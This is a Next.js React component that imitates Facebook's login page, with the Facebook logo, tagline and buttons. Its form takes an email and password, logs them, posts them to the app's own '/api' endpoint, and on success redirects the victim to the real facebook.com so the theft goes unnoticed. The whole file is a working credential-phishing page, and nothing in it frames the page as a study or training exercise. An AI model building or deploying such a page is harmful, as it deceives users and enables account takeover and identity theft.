'use client'

import Image from 'next/image';
import React, { useState } from 'react';
import image from '@/../public/face.png'
import { useRouter } from 'next/navigation';


const FacebookLogin = () => {
  const route = useRouter()
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  console.log(email, password);
  
  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    try {
      const response = await fetch('/api', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });

      const data = await response.json();
      console.log(data);
      
      if (data.status === "Success") {
        alert("Login successful")
        route.push('https://www.facebook.com')

      } else {
        console.error("Login failed:", data.error);
      }
    } catch (error) {
      console.error("Error during login:", error);
    }
  };

  return (
    <div className="flex justify-center items-center h-screen bg-gray-100">
      <div className="bg-white shadow-md rounded-lg p-8 w-full max-w-md">
        <div className="flex justify-center mb-6 py-[10px]">
          <Image src={image} alt="Facebook" className="w-14  object-contain" />
        </div>
        <h2 className="text-2xl font-bold mb-4">Facebook</h2>
        <p className="text-gray-600 mb-6">Facebook helps you connect and share with the people in your life.</p>
        <form onSubmit={handleLogin}>
          <div className="mb-4">
            <input
              type="text"
              placeholder="Email address or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="border text-black rounded-lg px-4 py-2 w-full focus:outline-none focus:ring focus:border-blue-500"
            />
          </div>
          <div className="mb-6">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="border text-black rounded-lg px-4 py-2 w-full focus:outline-none focus:ring focus:border-blue-500"
            />
          </div>
          <button
            type="submit"
            className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded-lg w-full"
          >
            Log in
          </button>
        </form>
        <div className="text-center mt-4">
          <a href="#" className="text-blue-500 hover:underline">
            Forgotten password?
          </a>
        </div>
        <div className="text-center mt-4">
          <button className="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded-lg">
            Create new account
          </button>
        </div>
      </div>
    </div>
  );
};

export default FacebookLogin;